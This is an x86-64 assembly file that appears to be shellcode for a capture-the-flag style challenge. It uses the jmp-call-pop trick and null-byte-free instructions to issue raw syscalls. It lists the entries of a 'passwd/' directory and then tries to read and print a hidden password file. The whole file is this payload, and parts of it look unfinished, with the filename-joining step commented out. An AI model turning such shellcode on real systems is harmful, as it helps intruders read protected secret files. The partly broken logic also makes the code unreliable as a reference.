BITS 64
global _start

_start:
jmp _push_filename

_readfile:
;open(rdi, rsi, rdx)
;open("passwd/", 0, 0)
pop rdi				;rdi = "passwd/\n"
xor byte [rdi + 7], 0x41	;fix \n
xor rdx, rdx
xor rsi, rsi
xor rax, rax
add al, 2
syscall

;getdents(fd, rsp, 0xFF)
mov rdi, rax                    ;fd
xor rdx, rdx
mov dl, 0xff                    ;size = 255
sub rsp, rdx                    ;room size
mov rsi, rsp
xor rax, rax
add al, 78
syscall

mov r8, rax
xor r14, r14

_readbuffer:
mov r9, [rsp + 16]		;d_off
and r9, 0x0000FFFF		;_word
mov r10, rsp
add r10, 18			;filename
xor r11, r11
inc r14

.LOOP:
inc r11
cmp byte [r10 + r11], 0
jne .LOOP

mov r13, r10

cmp r14, 4			;after 3 times, go to open, we have all entries of dirent
je _OPEN

;write(1, rsp, r11)
mov rdx, r11
xor rdi, rdi
inc rdi                         ;stdout
mov rsi, r10
xor rax, rax
mov r15, rsp			;save value of rsp before new line insertion
inc rax
syscall

;write(1, rsp ,1) 		;new ligne
mov byte [rsp], 0x0a
mov rdx, 1
mov rsi, rsp
xor rdi, rdi
inc rdi
xor rax, rax
inc rax
syscall

mov rsp, r15			;rsp = begin of dirent
mov r9, [rsp + 16]		;dirent size
and r9, 0x0000FFFF
add rsp, r9			;point on next dirent

jmp short _readbuffer

_OPEN:

;add rsp, 0xff

jmp _push_passwd

_WRITE:

pop r12				;r12 = "passwd/"
;add r12, [r10]			;r12 = "passwd/ + .passwd_xxx"

;open(".passwd_xXx", 0, 0)
xor rax, rax
mov al, 2
mov rdi, r12
xor rsi, rsi
xor rdx, rdx
syscall

;read(fd, rsp, 0x32)
mov rdi, rax
xor rdx, rdx
mov dl, 0x32
sub rsp, rdx
mov rsi, rsp
xor rax, rax
syscall

xchg rax, rdx

;write(1, rsp, 0xFF)
xor rdi, rdi
inc rdi                         ;stdout
mov rsi, r15
xor rax, rax
inc rax
mov rdx, 0xFF
syscall

.END:
;close()
xor rax, rax
add al, 60
syscall

_push_filename:
call _readfile
path: db "passwd/A"

_push_passwd:
call _WRITE
passwd: db "passwd/"
